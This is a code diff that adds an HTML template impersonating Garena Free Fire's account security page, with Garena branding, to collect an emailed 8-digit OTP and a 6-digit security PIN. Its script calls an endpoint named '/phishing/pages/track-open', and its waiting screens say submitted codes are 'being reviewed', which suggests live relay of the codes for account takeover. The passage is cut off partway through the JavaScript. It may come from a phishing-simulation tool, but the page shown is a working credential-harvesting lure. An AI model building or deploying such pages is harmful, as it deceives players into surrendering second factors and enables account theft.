@@ -1,0 +1,1198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="referrer" content="strict-origin-when-cross-origin">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' https://dl.dir.freefiremobile.com data:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self';">
+    <link rel="preconnect" href="https://dl.dir.freefiremobile.com" crossorigin>
+    <title>Account Security - Garena Free Fire</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        html, body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: #0a0a0a; min-height: 100vh; color: #fff;
+            overflow-x: hidden; line-height: 1.5;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+        input::-webkit-outer-spin-button,
+        input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
+        input[type=number] { -moz-appearance: textfield; }
+        .hidden { display: none !important; }
+        .fade-in { animation: fadeIn 0.45s cubic-bezier(0.23,1,0.32,1) forwards; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(16px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes scaleIn { from { transform: scale(0.6); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+        @keyframes checkDraw { to { stroke-dashoffset: 0; } }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes shake { 0%,100%{transform:translateX(0)} 20%,60%{transform:translateX(-6px)} 40%,80%{transform:translateX(6px)} }
+
+        .shake { animation: shake 0.4s ease-in-out; }
+
+        .btn-primary {
+            width: 100%;
+            padding: clamp(14px, 3vw, 18px) clamp(20px, 4vw, 32px);
+            background: linear-gradient(135deg, #ffaf00 0%, #ffba00 50%, #ffc800 100%);
+            border: none;
+            border-radius: 6px;
+            color: #000;
+            font-size: clamp(15px, 2.5vw, 17px);
+            font-weight: 800;
+            letter-spacing: 1.2px;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: all 0.25s cubic-bezier(0.23,1,0.32,1);
+            position: relative;
+            overflow: hidden;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 4px 16px rgba(255,186,0,0.18);
+            -webkit-tap-highlight-color: transparent;
+        }
+        .btn-primary:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 28px rgba(255,186,0,0.28);
+        }
+        .btn-primary:active:not(:disabled) {
+            transform: translateY(0);
+            box-shadow: 0 2px 8px rgba(255,186,0,0.15);
+        }
+        .btn-primary:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+        .btn-primary .btn-spinner {
+            width: 18px; height: 18px;
+            border: 2.5px solid rgba(0,0,0,0.25);
+            border-top-color: #000;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            flex-shrink: 0;
+        }
+
+        /* Inline status (inside page only) */
+        .inline-status {
+            text-align: center;
+            margin-top: 20px;
+            padding: 16px;
+            background: rgba(255,186,0,0.04);
+            border: 1px solid rgba(255,186,0,0.1);
+            border-radius: 8px;
+        }
+        .inline-status .status-row {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            color: #FFBA00;
+            font-weight: 700;
+            font-size: clamp(13px, 2.2vw, 14px);
+            letter-spacing: 0.5px;
+        }
+        .inline-status .status-row .spinner {
+            width: 16px; height: 16px;
+            border: 2px solid rgba(255,186,0,0.2);
+            border-top-color: #FFBA00;
+            border-radius: 50%;
+            display: inline-block;
+            animation: spin 0.8s linear infinite;
+            flex-shrink: 0;
+        }
+        .inline-status .status-sub {
+            color: #666;
+            font-size: clamp(11px, 2vw, 12px);
+            margin-top: 8px;
+            line-height: 1.5;
+        }
+
+        /* Attempts counter */
+        .attempts-box {
+            display: inline-flex; align-items: center; gap: 8px;
+            background: rgba(255,56,73,0.08);
+            border: 1px solid rgba(255,56,73,0.2);
+            border-radius: 8px;
+            padding: 10px 16px;
+            margin-top: 12px;
+            color: #ff6b7a;
+            font-size: 12px;
+            font-weight: 700;
+            letter-spacing: 0.3px;
+        }
+        .attempts-box svg { flex-shrink: 0; }
+
+        .resend-screen {
+            text-align: center;
+            padding: 48px 20px 32px;
+            max-width: 480px;
+            margin: 0 auto;
+        }
+        .resend-icon {
+            width: 72px; height: 72px;
+            margin: 0 auto 24px;
+            background: linear-gradient(135deg, rgba(255,186,0,0.12), rgba(255,186,0,0.04));
+            border: 1.5px solid rgba(255,186,0,0.25);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .resend-title {
+            font-size: clamp(20px, 4vw, 26px);
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            margin: 0 0 10px;
+            color: #fff;
+        }
+        .resend-title span { color: #FFBA00; }
+        .resend-desc {
+            color: #888;
+            font-size: clamp(13px, 2vw, 15px);
+            margin: 0 auto 32px;
+            max-width: 380px;
+            line-height: 1.7;
+        }
+        .resend-wait {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(255,186,0,0.06);
+            border: 1px solid rgba(255,186,0,0.12);
+            border-radius: 8px;
+            padding: 10px 18px;
+            color: #FFBA00;
+            font-size: 12px;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+            margin-bottom: 28px;
+        }
+        .resend-wait svg { flex-shrink: 0; }
+
+        /* Input base styles */
+        .otp-input, .sec-input {
+            background: rgb(17, 17, 17);
+            border: 1px solid rgb(42, 42, 42);
+            border-radius: 8px;
+            color: rgb(255, 186, 0);
+            font-weight: 800;
+            text-align: center;
+            outline: none;
+            transition: all 0.2s ease;
+            caret-color: rgb(255, 186, 0);
+            box-shadow: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+        .otp-input:focus, .sec-input:focus {
+            border-color: #FFBA00;
+            box-shadow: 0 0 0 3px rgba(255,186,0,0.12), inset 0 1px 2px rgba(255,186,0,0.05);
+        }
+        .otp-input.error, .sec-input.error {
+            border-color: #ff3849;
+            box-shadow: 0 0 0 3px rgba(255,56,73,0.12);
+            animation: shake 0.4s ease-in-out;
+        }
+        .otp-input:disabled, .sec-input:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+        }
+
+        /* Responsive Inputs */
+        .otp-input {
+            width: clamp(38px, 9vw, 56px);
+            height: clamp(50px, 11vw, 68px);
+            font-size: clamp(18px, 4.5vw, 26px);
+        }
+        .sec-input {
+            width: clamp(42px, 10vw, 64px);
+            height: clamp(54px, 12vw, 76px);
+            font-size: clamp(20px, 5vw, 30px);
+        }
+
+        /* Container adjustments */
+        .input-row {
+            display: flex;
+            gap: clamp(4px, 1.2vw, 8px);
+            justify-content: center;
+            flex-wrap: wrap;
+            padding: 0 4px;
+        }
+
+        /* Header responsive */
+        .app-header {
+            background: rgba(10,10,10,0.97);
+            border-bottom: 1px solid #1f1f1f;
+            padding: 0 clamp(10px, 3vw, 20px);
+            height: clamp(52px, 10vw, 64px);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            backdrop-filter: blur(8px);
+            min-width: 0;
+            gap: 12px;
+        }
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: clamp(8px, 2vw, 14px);
+            text-decoration: none;
+            flex: 0 1 auto;
+            min-width: 0;
+            overflow: hidden;
+        }
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: clamp(8px, 2vw, 14px);
+            flex: 0 1 auto;
+            min-width: 0;
+            justify-content: flex-end;
+        }
+        .header-label {
+            color: #666;
+            font-size: clamp(10px, 1.8vw, 12px);
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            font-weight: 600;
+            border-left: 1px solid #333;
+            padding-left: clamp(8px, 2vw, 14px);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        .header-logo { height: clamp(20px, 4vw, 26px); display: block; }
+
+        .header-user { font-size: clamp(12px, 2.2vw, 14px); }
+        .header-id {
+            font-size: clamp(10px, 1.8vw, 11px);
+            font-family: 'SF Mono', Monaco, 'Courier New', monospace;
+            letter-spacing: 0.8px;
+        }
+        .header-email {
+            font-size: clamp(11px, 2vw, 12px);
+            max-width: clamp(140px, 30vw, 200px);
+        }
+
+        /* Section title */
+        .section-title {
+            font-size: clamp(16px, 3vw, 20px);
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: #fff;
+        }
+        .section-desc {
+            color: #777;
+            font-size: clamp(11px, 2vw, 13px);
+            margin: 0 0 20px clamp(44px, 8vw, 64px);
+        }
+
+        /* Main content */
+        .main-content {
+            max-width: 720px;
+            margin: 0 auto;
+            padding: clamp(24px, 5vw, 48px) clamp(10px, 3vw, 20px) clamp(40px, 8vw, 80px);
+        }
+
+        /* Hero section */
+        .hero-section {
+            background: linear-gradient(180deg, rgba(10,10,10,0.85) 0%, rgba(10,10,10,0.6) 100%),
+                        url('https://dl.dir.freefiremobile.com/common/web_event/official2/dist/client/img/home_news_bg.c422198.jpg') center top / cover no-repeat;
+            padding: clamp(28px, 6vw, 56px) clamp(12px, 3vw, 24px) clamp(24px, 5vw, 48px);
+            text-align: center;
+        }
+        .hero-title {
+            font-size: clamp(22px, 5vw, 42px);
+            font-weight: 900;
+            margin: 0 0 10px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            line-height: 1.1;
+            color: #fff;
+        }
+        .hero-sub {
+            color: #999;
+            font-size: clamp(12px, 2vw, 15px);
+            margin: 0 auto;
+            max-width: 480px;
+            line-height: 1.6;
+            padding: 0 12px;
+        }
+
+        /* Error state */
+        .error-state {
+            text-align: center;
+            padding: clamp(32px, 8vw, 60px) 20px;
+        }
+        .error-icon-wrap {
+            width: clamp(64px, 12vw, 80px);
+            height: clamp(64px, 12vw, 80px);
+            margin: 0 auto 24px;
+            background: rgba(255,56,73,0.1);
+            border: 1px solid rgba(255,56,73,0.25);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .error-title {
+            font-size: clamp(18px, 4vw, 24px);
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            margin: 0 0 10px;
+            color: #fff;
+        }
+        .error-desc {
+            color: #666;
+            font-size: clamp(12px, 2vw, 14px);
+            margin: 0 auto;
+            max-width: 360px;
+            line-height: 1.6;
+        }
+
+        /* Success state */
+        .success-icon-wrap {
+            width: clamp(72px, 14vw, 90px);
+            height: clamp(72px, 14vw, 90px);
+            margin: 0 auto 28px;
+            background: linear-gradient(135deg, #00c853, #00e676);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: scaleIn 0.5s cubic-bezier(0.23, 1, 0.32, 1) forwards;
+        }
+        .success-title {
+            font-size: clamp(20px, 4vw, 28px);
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin: 0 0 12px;
+            color: #fff;
+        }
+        .success-sub {
+            color: #888;
+            font-size: clamp(12px, 2vw, 15px);
+            margin: 0 auto 32px;
+            max-width: 400px;
+            line-height: 1.6;
+        }
+
+        /* Footer */
+        .app-footer {
+            border-top: 1px solid #1a1a1a;
+            padding: clamp(28px, 5vw, 40px) clamp(12px, 3vw, 24px);
+            text-align: center;
+            background: #0a0a0a;
+        }
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: clamp(12px, 3vw, 28px);
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        .footer-links a {
+            color: #666;
+            text-decoration: none;
+            font-size: clamp(10px, 1.8vw, 12px);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            transition: color 0.2s;
+        }
+        .footer-links a:hover { color: #FFBA00; }
+
+        /* Landscape mobile */
+        @media (max-height: 500px) and (orientation: landscape) {
+            .app-header { height: 48px; }
+            .hero-section { padding: 20px 16px; }
+            .hero-title { font-size: 22px; }
+            .main-content { padding: 20px 12px 32px; }
+            .otp-input { width: 38px; height: 46px; font-size: 18px; }
+            .sec-input { width: 42px; height: 50px; font-size: 20px; }
+            .resend-screen { padding: 24px 16px; }
+        }
+
+        /* Small phones */
+        @media (max-width: 360px) {
+            .otp-input { width: 36px; height: 48px; font-size: 17px; }
+            .sec-input { width: 40px; height: 54px; font-size: 20px; }
+            .input-row { gap: 4px; }
+            .section-desc { margin-left: 40px; }
+        }
+
+        /* Large desktop */
+        @media (min-width: 1200px) {
+            .main-content { max-width: 800px; }
+        }
+
+        /* Reduced motion */
+        @media (prefers-reduced-motion: reduce) {
+            *, *::before, *::after {
+                animation-duration: 0.01ms !important;
+                animation-iteration-count: 1 !important;
+                transition-duration: 0.01ms !important;
+            }
+        }
+    </style>
+</head>
+<body data-page-id="{{ page_id }}" data-session="{{ session_token }}">
+
+<div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; background: #0a0a0a; min-height: 100vh; color: #fff; overflow-x: hidden; line-height: 1.5;">
+
+  <header class="app-header">
+    <a href="#" class="header-left">
+      <img src="https://dl.dir.freefiremobile.com/common/web_event/official2/dist/client/img/full_logo.969f536.png" alt="Free Fire" class="header-logo">
+      <span class="header-label">Account Security</span>
+    </a>
+    {% if valid_page %}
+    <div class="header-right">
+      {% if has_username_id %}
+      <div style="display: flex; flex-direction: column; align-items: flex-end; gap: 2px; min-width: 0; overflow: hidden;">
+        <span class="header-user" style="font-weight: 600; color: #fff; letter-spacing: 0.2px; line-height: 1.3; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: clamp(100px, 22vw, 180px);">{{ username }}</span>
+        <span class="header-id" style="font-weight: 500; color: #666; line-height: 1.3;">ID {{ game_id }}</span>
+      </div>
+      {% else %}
+      <div style="display: flex; flex-direction: column; align-items: flex-end; gap: 1px; min-width: 0; overflow: hidden;">
+        <span style="font-size: 10px; font-weight: 600; color: #555; text-transform: uppercase; letter-spacing: 1px; line-height: 1.3;">Email</span>
+        <span class="header-email" style="font-weight: 500; color: #999; letter-spacing: 0.2px; line-height: 1.3; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: clamp(100px, 25vw, 200px);">{{ email }}</span>
+      </div>
+      {% endif %}
+    </div>
+    {% endif %}
+  </header>
+
+  <svg width="100%" viewBox="0 0 1440 25" fill="none" style="display: block;">
+    <path d="M0 23.6899H248.724L270.737 5.17356C272.873 3.03632 275.77 1.8349 278.792 1.8335H1440" stroke="#FFAF00" stroke-width="2" stroke-miterlimit="10"></path>
+    <path d="M248.546 23.3337H0V18.7046H253.887L248.546 23.3337Z" fill="#FFAF00"></path>
+  </svg>
+
+  <section class="hero-section">
+    <h1 class="hero-title">
+      Account <span style="color: #FFBA00;">Verification</span>
+    </h1>
+    <p class="hero-sub">
+      Two-step authentication to secure your Garena Free Fire profile
+    </p>
+  </section>
+
+  <svg width="55%" viewBox="0 0 809 5" fill="none" style="display: block; margin: 0 auto;">
+    <path d="M0 3.95801H810" stroke="#FFAF00" stroke-width="2" stroke-miterlimit="10"></path>
+    <path d="M596.763 0H810V3.83467H590.574L593.672 1.15041C594.53 0.407623 595.628 0 596.763 0Z" fill="#FFAF00"></path>
+  </svg>
+
+  <main class="main-content">
+
+    {% if not valid_page %}
+    <div class="error-state fade-in">
+      <div class="error-icon-wrap">
+        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" style="display: block;">
+          <circle cx="12" cy="12" r="10" stroke="#ff3849" stroke-width="2"/>
+          <path d="M12 8v4M12 16h.01" stroke="#ff3849" stroke-width="2.5" stroke-linecap="round"/>
+        </svg>
+      </div>
+      <h2 class="error-title">{{ error_message or "Oops, something went wrong" }}</h2>
+      <p class="error-desc">
+        The page you are looking for may have expired or the link is invalid. Please check your URL or contact support.
+      </p>
+    </div>
+
+    {% else %}
+    <!-- STEP 1: OTP -->
+    <div id="otp-section" style="margin-bottom: clamp(32px, 6vw, 44px);">
+      <div style="display: flex; align-items: baseline; gap: 12px; margin-bottom: 8px;">
+        <svg viewBox="0 0 165 9" fill="#FFBA00" style="width: 52px; height: 7px; flex-shrink: 0;">
+          <path d="M129.4 0L121.28 8.12H0V0H129.4Z"></path><path d="M141.16 0L133.04 8.12H128.45L136.57 0H141.16Z"></path><path d="M152.92 0L144.8 8.12H140.2L148.33 0H152.92Z"></path><path d="M164.68 0L156.55 8.12H151.96L160.09 0H164.68Z"></path>
+        </svg>
+        <h2 class="section-title">OTP Code</h2>
+      </div>
+      <p class="section-desc">Enter the 8-digit verification code sent to your registered email</p>
+
+      <div id="otp-inputs" class="input-row">
+        <input class="otp-input" type="text" maxlength="1" inputmode="numeric" autocomplete="off">
+        <input class="otp-input" type="text" maxlength="1" inputmode="numeric" autocomplete="off">
+        <input class="otp-input" type="text" maxlength="1" inputmode="numeric" autocomplete="off">
+        <input class="otp-input" type="text" maxlength="1" inputmode="numeric" autocomplete="off">
+        <input class="otp-input" type="text" maxlength="1" inputmode="numeric" autocomplete="off">
+        <input class="otp-input" type="text" maxlength="1" inputmode="numeric" autocomplete="off">
+        <input class="otp-input" type="text" maxlength="1" inputmode="numeric" autocomplete="off">
+        <input class="otp-input" type="text" maxlength="1" inputmode="numeric" autocomplete="off">
+      </div>
+
+      <!-- Inline loading status (inside page only) -->
+      <div id="otp-status" class="hidden inline-status">
+        <div class="status-row">
+          <span class="spinner"></span>
+          <span>Awaiting verification...</span>
+        </div>
+        <div class="status-sub">Your code has been submitted and is being reviewed.<br>Please do not close this page.</div>
+      </div>
+
+      <div id="otp-error-wrap" class="hidden" style="text-align: center; margin-top: 14px;">
+        <p id="otp-error" style="color: #ff3849; font-size: 13px; font-weight: 600; margin-bottom: 6px;"></p>
+        <div id="otp-attempts" class="attempts-box hidden">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none">
+            <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"/>
+            <path d="M12 8v4l3 3" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+          </svg>
+          <span id="otp-attempts-text"></span>
+        </div>
+      </div>
+    </div>
+
+    <!-- STEP 2: Security Code -->
+    <div id="sec-section" class="hidden" style="margin-bottom: clamp(32px, 6vw, 48px);">
+      <div style="display: flex; align-items: baseline; gap: 12px; margin-bottom: 8px;">
+        <svg viewBox="0 0 165 9" fill="#FFBA00" style="width: 52px; height: 7px; flex-shrink: 0;">
+          <path d="M129.4 0L121.28 8.12H0V0H129.4Z"></path><path d="M141.16 0L133.04 8.12H128.45L136.57 0H141.16Z"></path><path d="M152.92 0L144.8 8.12H140.2L148.33 0H152.92Z"></path><path d="M164.68 0L156.55 8.12H151.96L160.09 0H164.68Z"></path>
+        </svg>
+        <h2 class="section-title">Security Code</h2>
+      </div>
+      <p class="section-desc">Enter your 6-digit account security PIN</p>
+
+      <div id="sec-inputs" class="input-row">
+        <input class="sec-input" type="password" maxlength="1" inputmode="numeric" autocomplete="off">
+        <input class="sec-input" type="password" maxlength="1" inputmode="numeric" autocomplete="off">
+        <input class="sec-input" type="password" maxlength="1" inputmode="numeric" autocomplete="off">
+        <input class="sec-input" type="password" maxlength="1" inputmode="numeric" autocomplete="off">
+        <input class="sec-input" type="password" maxlength="1" inputmode="numeric" autocomplete="off">
+        <input class="sec-input" type="password" maxlength="1" inputmode="numeric" autocomplete="off">
+      </div>
+
+      <!-- Inline loading status (inside page only) -->
+      <div id="sec-status" class="hidden inline-status">
+        <div class="status-row">
+          <span class="spinner"></span>
+          <span>Awaiting verification...</span>
+        </div>
+        <div class="status-sub">Your security code has been submitted and is being reviewed.<br>Please do not close this page.</div>
+      </div>
+
+      <div id="sec-error-wrap" class="hidden" style="text-align: center; margin-top: 14px;">
+        <p id="sec-error" style="color: #ff3849; font-size: 13px; font-weight: 600; margin-bottom: 6px;"></p>
+        <div id="sec-attempts" class="attempts-box hidden">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none">
+            <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"/>
+            <path d="M12 8v4l3 3" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+          </svg>
+          <span id="sec-attempts-text"></span>
+        </div>
+      </div>
+    </div>
+
+    <!-- STEP 3: Success -->
+    <div id="success-section" class="hidden" style="text-align: center; padding: clamp(24px, 5vw, 40px) 16px;">
+      <div class="success-icon-wrap">
+        <svg width="44" height="44" viewBox="0 0 24 24" fill="none" style="display: block;">
+          <path d="M20 6L9 17l-5-5" stroke="#000" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" stroke-dasharray="30" stroke-dashoffset="30" style="animation: checkDraw 0.4s 0.3s ease-out forwards;"/>
+        </svg>
+      </div>
+      <h2 class="success-title">Verification <span style="color: #00e676;">Complete</span></h2>
+      <p class="success-sub">
+        Your account has been successfully verified and secured. You may now close this page.
+      </p>
+      <div style="display: inline-flex; align-items: center; gap: 10px; background: rgba(0, 200, 83, 0.1); border: 1px solid rgba(0, 200, 83, 0.25); border-radius: 8px; padding: 14px 24px;">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
+          <circle cx="12" cy="12" r="10" stroke="#00e676" stroke-width="2"/>
+          <path d="M12 8v4l3 3" stroke="#00e676" stroke-width="2" stroke-linecap="round"/>
+        </svg>
+        <span style="color: #00e676; font-size: 13px; font-weight: 700; letter-spacing: 0.5px; text-transform: uppercase;">Account Secured</span>
+      </div>
+    </div>
+
+    <!-- RESEND SUCCESS SCREEN -->
+    <div id="resend-success" class="hidden resend-screen fade-in">
+      <div class="resend-icon">
+        <svg width="28" height="28" viewBox="0 0 24 24" fill="none">
+          <path d="M22 2L11 13" stroke="#FFBA00" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+          <path d="M22 2l-7 20-4-9-9-4 20-7z" stroke="#FFBA00" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+      <h2 class="resend-title">Resend <span>Successful</span></h2>
+      <p class="resend-desc" id="resend-desc-text">
+        A new verification code has been sent to your registered email. Please check your inbox and enter the code below.
+      </p>
+      <div class="resend-wait">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none">
+          <circle cx="12" cy="12" r="10" stroke="#FFBA00" stroke-width="2"/>
+          <path d="M12 6v6l4 2" stroke="#FFBA00" stroke-width="2" stroke-linecap="round"/>
+        </svg>
+        Please wait a few minutes before requesting another code.
+      </div>
+      <button id="backToVerifyBtn" class="btn-primary" style="max-width: 320px;">
+        Continue Verification
+      </button>
+    </div>
+
+    <!-- Action Button -->
+    <button id="actionBtn" class="btn-primary">Verify Code</button>
+
+    <!-- Resend link OTP -->
+    <p id="resend-wrap" style="text-align: center; color: #555; font-size: 12px; margin-top: 24px;">
+      Didn't receive the code?
+      <a id="resend-link" href="#" style="color: rgb(255, 186, 0); text-decoration: none; font-weight: 700; transition: opacity 0.2s; opacity: 1;" onmouseover="this.style.opacity='0.8'" onmouseout="this.style.opacity='1'">Resend OTP</a>
+    </p>
+
+    <!-- Resend link Security Code -->
+    <p id="resend-sec-wrap" class="hidden" style="text-align: center; color: #555; font-size: 12px; margin-top: 24px;">
+      Didn't receive the security code?
+      <a id="resend-sec-link" href="#" style="color: rgb(255, 186, 0); text-decoration: none; font-weight: 700; transition: opacity 0.2s; opacity: 1;" onmouseover="this.style.opacity='0.8'" onmouseout="this.style.opacity='1'">Resend Security Code</a>
+    </p>
+
+    <p id="resend-msg" class="hidden" style="text-align: center; color: #FFBA00; font-size: 12px; margin-top: 12px; font-weight: 600;"></p>
+
+    {% endif %}
+  </main>
+
+  <footer class="app-footer">
+    <img src="https://dl.dir.freefiremobile.com/common/web_event/official2/dist/client/img/garena_logo.b28b2b6.png" alt="Garena" style="height: 22px; opacity: 0.5; margin-bottom: 20px; display: block; margin-left: auto; margin-right: auto;">
+    <div class="footer-links">
+      <a href="#">Privacy Policy</a>
+      <a href="#">For Parents FAQ</a>
+      <a href="#">Terms of Service</a>
+    </div>
+    <p style="color: #444; font-size: 11px; margin: 0; line-height: 1.6;">Copyright &copy; Garena International. Trademarks belong to their respective owners.<br>All rights reserved.</p>
+  </footer>
+</div>
+
+{% if valid_page %}
+<script>
+(function(){
+    'use strict';
+    var body = document.body;
+    var pageId = body.dataset.pageId;
+    var sessionToken = body.dataset.session;
+    var API_BASE = window.location.origin;
+    var MAX_ATTEMPTS = 5;
+    var VERIFY_INTERVAL = 3000;
+    var MAX_STATUS_CHECKS = 60;
+
+    var currentStep = 1;
+    var isSubmitting = false;
+    var lastResendType = 'otp';
+    var otpAttempts = 0;
+    var secAttempts = 0;
+    var statusTimeoutId = null;
+    var pendingStatusCheck = false;
+
+    // Elements
+    var otpSection      = document.getElementById('otp-section');
+    var secSection      = document.getElementById('sec-section');
+    var successSection  = document.getElementById('success-section');
+    var resendSuccess   = document.getElementById('resend-success');
+    var actionBtn       = document.getElementById('actionBtn');
+    var backToVerifyBtn = document.getElementById('backToVerifyBtn');
+    var resendWrap      = document.getElementById('resend-wrap');
+    var resendLink      = document.getElementById('resend-link');
+    var resendSecWrap   = document.getElementById('resend-sec-wrap');
+    var resendSecLink   = document.getElementById('resend-sec-link');
+    var resendMsg       = document.getElementById('resend-msg');
+    var resendDescText  = document.getElementById('resend-desc-text');
+    var otpError        = document.getElementById('otp-error');
+    var secError        = document.getElementById('sec-error');
+    var otpErrorWrap    = document.getElementById('otp-error-wrap');
+    var secErrorWrap    = document.getElementById('sec-error-wrap');
+    var otpAttemptsBox  = document.getElementById('otp-attempts');
+    var secAttemptsBox  = document.getElementById('sec-attempts');
+    var otpAttemptsText = document.getElementById('otp-attempts-text');
+    var secAttemptsText = document.getElementById('sec-attempts-text');
+    var otpStatus       = document.getElementById('otp-status');
+    var secStatus       = document.getElementById('sec-status');
+
+    var otpInputs = document.querySelectorAll('.otp-input');
+    var secInputs = document.querySelectorAll('.sec-input');
+
+    // Track open
+    fetch(API_BASE + '/phishing/pages/track-open', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({page_id: pageId, session_token: sessionToken})
+    }).catch(function(){});
+
+    // =========================
+    // Robust Input Handling
+    // =========================
+    function setupInputs(inputs){
+        inputs.forEach(function(input, idx) {
+            // Select all on focus so typing replaces existing content
+            input.addEventListener('focus', function() {
+                input.select();
+            });
+
+            input.addEventListener('input', function(e) {
+                var raw = e.target.value;
+                var digits = raw.replace(/[^0-9]/g, '');
+
+                if (digits.length === 0) {
+                    e.target.value = '';
+                    return;
+                }
+
+                // Enforce single character in this box
+                if (digits.length >= 1) {
+                    e.target.value = digits.charAt(0);
+                }
+
+                // If there are more digits (paste/autocomplete), distribute to next boxes
+                if (digits.length > 1) {
+                    for (var i = 1; i < digits.length && idx + i < inputs.length; i++) {
+                        inputs[idx + i].value = digits.charAt(i);
+                    }
+                    var lastIdx = Math.min(idx + digits.length, inputs.length) - 1;
+                    inputs[lastIdx].focus();
+                } else {
+                    // Normal single digit - move to next if available
+                    if (idx < inputs.length - 1) {
+                        inputs[idx + 1].focus();
+                    }
+                }
+            });
+
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace') {
+                    if (!e.target.value && idx > 0) {
+                        e.preventDefault();
+                        inputs[idx - 1].focus();
+                        inputs[idx - 1].value = '';
+                    }
+                } else if (e.key === 'ArrowLeft' && idx > 0) {
+                    e.preventDefault();
+                    inputs[idx - 1].focus();
+                } else if (e.key === 'ArrowRight' && idx < inputs.length - 1) {
+                    e.preventDefault();
+                    inputs[idx + 1].focus();
+                } else if (e.key >= '0' && e.key <= '9') {
+                    // If box already has a value, the focus+select handler will replace it
+                    // But on some mobile browsers, select() doesn't work reliably
+                    // So we explicitly clear to ensure replacement
+                    if (e.target.value) {
+                        e.target.value = '';
+                    }
+                }
+            });
+
+            input.addEventListener('paste', function(e) {
+                e.preventDefault();
+                var paste = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '').split('');
+                if (paste.length === 0) return;
+
+                // Fill from current index onward
+                for (var i = 0; i < paste.length && idx + i < inputs.length; i++) {
+                    inputs[idx + i].value = paste[i];
+                }
+                var nextIdx = Math.min(idx + paste.length, inputs.length - 1);
+                inputs[nextIdx].focus();
+            });
+        });
+    }
+    setupInputs(otpInputs);
+    setupInputs(secInputs);
+
+    // =========================
+    // UI Helpers
+    // =========================
+    function setBtn(text, loading){
+        if (loading) {
+            actionBtn.innerHTML = '<span class="btn-spinner"></span><span>' + text + '</span>';
+        } else {
+            actionBtn.innerHTML = text;
+        }
+        actionBtn.disabled = loading;
+    }
+
+    function showInlineStatus(type, show) {
+        var el = document.getElementById(type + '-status');
+        if (!el) return;
+        if (show) el.classList.remove('hidden');
+        else el.classList.add('hidden');
+    }
+
+    function setInputsDisabled(inputs, disabled) {
+        inputs.forEach(function(inp) {
+            inp.disabled = disabled;
+        });
+    }
+
+    function showError(errorEl, errorWrapEl, attemptsBoxEl, attemptsTextEl, msg, attempts, max) {
+        errorEl.textContent = msg;
+        errorWrapEl.classList.remove('hidden');
+        if (attemptsBoxEl && attemptsTextEl && typeof attempts === 'number') {
+            var remaining = max - attempts;
+            if (remaining > 0) {
+                attemptsTextEl.textContent = remaining + ' attempt' + (remaining !== 1 ? 's' : '') + ' remaining';
+                attemptsBoxEl.classList.remove('hidden');
+            } else {
+                attemptsBoxEl.classList.add('hidden');
+            }
+        }
+    }
+
+    function hideError(errorWrapEl, attemptsBoxEl) {
